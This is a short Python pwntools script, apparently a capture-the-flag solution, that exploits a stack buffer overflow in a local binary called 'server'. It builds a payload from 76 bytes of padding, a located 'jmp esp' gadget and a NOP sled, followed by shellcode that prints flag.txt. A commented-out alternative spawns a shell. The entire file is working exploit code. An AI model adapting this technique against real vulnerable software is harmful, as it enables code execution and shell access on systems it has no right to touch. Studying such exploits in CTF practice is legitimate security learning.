from pwn import *


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

exe = 'server'
elf = context.binary = ELF(exe, checksec=False)

p = elf.process()

context.log_level = 'debug'

# Offset to EIP
padding = 76

# Assemble the byte sequence for 'jmp esp' so we can search for it
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

# Print flag
shellcode = asm(shellcraft.cat('flag.txt'))
# shellcode = asm(shellcraft.sh())
# Exit
shellcode += asm(shellcraft.exit())

# Build payload
payload = flat(
    asm('nop') * padding,
    jmp_esp,
    asm('nop') * 16,
    shellcode
)

# Write payload to file
write("payload", payload)

# Exploit
p.sendlineafter(b':', payload)

# Get flag/shell
p.interactive()
